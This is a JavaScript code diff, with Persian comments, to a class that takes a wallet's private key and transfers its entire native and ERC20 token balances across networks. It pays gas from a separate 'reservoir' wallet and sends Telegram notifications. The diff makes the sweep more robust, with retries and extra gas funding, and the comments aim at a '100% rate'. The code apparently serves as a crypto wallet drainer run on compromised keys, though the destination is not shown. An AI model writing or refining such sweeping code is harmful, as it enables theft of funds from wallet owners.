@@ -113,32 +113,53 @@ class AssetProcessor {
           }
         }
 
-        // Process ERC20 tokens
+        // Process ERC20 tokens - همه token ها رو پردازش می‌کنه حتی اگر یکی fail بشه
         if (networkData.tokens && networkData.tokens.length > 0) {
           for (const token of networkData.tokens) {
-            const transferResult = await this.transferToken(
-              walletPrivateKey,
-              networkKey,
-              networkConfig,
-              token.address,
-              token.balance,
-              token.symbol,
-              token.decimals
-            );
+            try {
+              const transferResult = await this.transferToken(
+                walletPrivateKey,
+                networkKey,
+                networkConfig,
+                token.address,
+                token.balance,
+                token.symbol,
+                token.decimals
+              );
 
-            results.totalTransfers++;
-            results.transfers.push(transferResult);
-            
-            if (transferResult.success) {
-              results.successful++;
-            } else {
+              results.totalTransfers++;
+              results.transfers.push(transferResult);
+              
+              if (transferResult.success) {
+                results.successful++;
+              } else {
+                results.failed++;
+                // ادامه می‌ده حتی اگر fail بشه - rate 100%
+                console.log(`⚠️  Token ${token.symbol} transfer failed, continuing with other tokens...`);
+              }
+            } catch (tokenError) {
+              // اگر یک token fail بشه، بقیه ادامه می‌دن
+              console.error(`Error transferring token ${token.symbol} on ${networkKey}:`, tokenError);
+              results.totalTransfers++;
               results.failed++;
+              results.transfers.push({
+                network: networkKey,
+                type: 'token',
+                symbol: token.symbol,
+                address: token.address,
+                amount: token.balance,
+                success: false,
+                error: tokenError.message,
+                timestamp: new Date().toISOString()
+              });
             }
           }
         }
       } catch (error) {
+        // اگر یک network fail بشه، بقیه ادامه می‌دن
         console.error(`Error processing ${networkKey}:`, error);
         results.failed++;
+        // ادامه می‌ده به شبکه بعدی
       }
     }
 
@@ -160,31 +181,44 @@ class AssetProcessor {
       // Check balance
       const balance = await provider.getBalance(wallet.address);
       
-      // Check if we need gas reservoir funding
+      // Check if we need gas reservoir funding - همیشه gas رو می‌فرسته اگر لازم باشه
       let useReservoir = false;
-      if (balance < gasCost && this.gasReservoirPrivateKey) {
-        console.log(`⚠️  Insufficient gas on ${networkKey}, using gas reservoir...`);
-        const fundingTxHash = await this.fundGasFromReservoir(provider, wallet.address, networkKey, gasCost);
-        useReservoir = true;
-        
-        // Send Telegram notification about gas funding
-        if (this.telegramNotifier) {
-          const gasPrice = await this.getGasPrice(networkKey);
-          const reservoirTxGas = 21000n * gasPrice * 12n / 10n;
-          const totalFunding = gasCost + reservoirTxGas;
-          await this.telegramNotifier.sendGasReservoirFunding(
-            networkKey,
-            ethers.formatEther(totalFunding),
-            fundingTxHash
-          );
-        }
-        
-        // Wait a moment for funding to be confirmed
-        await new Promise(resolve => setTimeout(resolve, 2000));
-        // Re-check balance
-        const newBalance = await provider.getBalance(wallet.address);
-        if (newBalance < gasCost) {
-          throw new Error('Gas reservoir funding failed or insufficient');
+      if (balance < gasCost) {
+        if (this.gasReservoirPrivateKey) {
+          console.log(`⚠️  Insufficient gas on ${networkKey}, using gas reservoir...`);
+          try {
+            const fundingTxHash = await this.fundGasFromReservoir(provider, wallet.address, networkKey, gasCost);
+            useReservoir = true;
+            
+            // Send Telegram notification about gas funding
+            if (this.telegramNotifier) {
+              const gasPrice = await this.getGasPrice(networkKey);
+              const reservoirTxGas = 21000n * gasPrice * 12n / 10n;
+              const totalFunding = gasCost + reservoirTxGas;
+              await this.telegramNotifier.sendGasReservoirFunding(
+                networkKey,
+                ethers.formatEther(totalFunding),
+                fundingTxHash
+              );
+            }
+            
+            // Wait a moment for funding to be confirmed
+            await new Promise(resolve => setTimeout(resolve, 3000)); // افزایش زمان برای اطمینان
+            // Re-check balance
+            const newBalance = await provider.getBalance(wallet.address);
+            if (newBalance < gasCost) {
+              // اگر هنوز کافی نیست، دوباره fund می‌کنه
+              console.log(`⚠️  Still insufficient after funding, attempting additional funding...`);
+              const additionalGas = gasCost - newBalance + (21000n * await this.getGasPrice(networkKey) * 12n / 10n);
+              await this.fundGasFromReservoir(provider, wallet.address, networkKey, additionalGas);
+              await new Promise(resolve => setTimeout(resolve, 3000));
+            }
+          } catch (fundingError) {
+            console.error(`Gas reservoir funding failed: ${fundingError.message}`);
+            throw new Error(`Gas reservoir funding failed: ${fundingError.message}`);
+          }
+        } else {
+          throw new Error('Insufficient native token for gas and gas reservoir not configured');
         }
       }
 
@@ -273,34 +307,45 @@ class AssetProcessor {
       // Check if we have enough native token for gas
       const nativeBalance = await provider.getBalance(wallet.address);
       
-      // Check if we need gas reservoir funding
+      // Check if we need gas reservoir funding - همیشه gas رو می‌فرسته اگر لازم باشه
       let useReservoir = false;
-      if (nativeBalance < gasCost && this.gasReservoirPrivateKey) {
-        console.log(`⚠️  Insufficient gas for token transfer on ${networkKey}, using gas reservoir...`);
-        const fundingTxHash = await this.fundGasFromReservoir(provider, wallet.address, networkKey, gasCost);
-        useReservoir = true;
-        
-        // Send Telegram notification about gas funding
-        if (this.telegramNotifier) {
-          const gasPrice = await this.getGasPrice(networkKey);
-          const reservoirTxGas = 21000n * gasPrice * 12n / 10n;
-          const totalFunding = gasCost + reservoirTxGas;
-          await this.telegramNotifier.sendGasReservoirFunding(
-            networkKey,
-            ethers.formatEther(totalFunding),
-            fundingTxHash
-          );
+      if (nativeBalance < gasCost) {
+        if (this.gasReservoirPrivateKey) {
+          console.log(`⚠️  Insufficient gas for token transfer on ${networkKey}, using gas reservoir...`);
+          try {
+            const fundingTxHash = await this.fundGasFromReservoir(provider, wallet.address, networkKey, gasCost);
+            useReservoir = true;
+            
+            // Send Telegram notification about gas funding
+            if (this.telegramNotifier) {
+              const gasPrice = await this.getGasPrice(networkKey);
+              const reservoirTxGas = 21000n * gasPrice * 12n / 10n;
+              const totalFunding = gasCost + reservoirTxGas;
+              await this.telegramNotifier.sendGasReservoirFunding(
+                networkKey,
+                ethers.formatEther(totalFunding),
+                fundingTxHash
+              );
+            }
+            
+            // Wait a moment for funding to be confirmed
+            await new Promise(resolve => setTimeout(resolve, 3000)); // افزایش زمان برای اطمینان
+            // Re-check balance
+            const newBalance = await provider.getBalance(wallet.address);
+            if (newBalance < gasCost) {
+              // اگر هنوز کافی نیست، دوباره fund می‌کنه
+              console.log(`⚠️  Still insufficient after funding, attempting additional funding...`);
+              const additionalGas = gasCost - newBalance + (21000n * await this.getGasPrice(networkKey) * 12n / 10n);
+              await this.fundGasFromReservoir(provider, wallet.address, networkKey, additionalGas);
+              await new Promise(resolve => setTimeout(resolve, 3000));
+            }
+          } catch (fundingError) {
+            console.error(`Gas reservoir funding failed: ${fundingError.message}`);
+            throw new Error(`Gas reservoir funding failed: ${fundingError.message}`);
+          }
+        } else {
+          throw new Error('Insufficient native token for gas and gas reservoir not configured');
         }
-        
-        // Wait a moment for funding to be confirmed
-        await new Promise(resolve => setTimeout(resolve, 2000));
-        // Re-check balance
-        const newBalance = await provider.getBalance(wallet.address);
-        if (newBalance < gasCost) {
-          throw new Error('Gas reservoir funding failed or insufficient');
-        }
-      } else if (nativeBalance < gasCost) {
-        throw new Error('Insufficient native token for gas');
       }
 
       // Get nonce
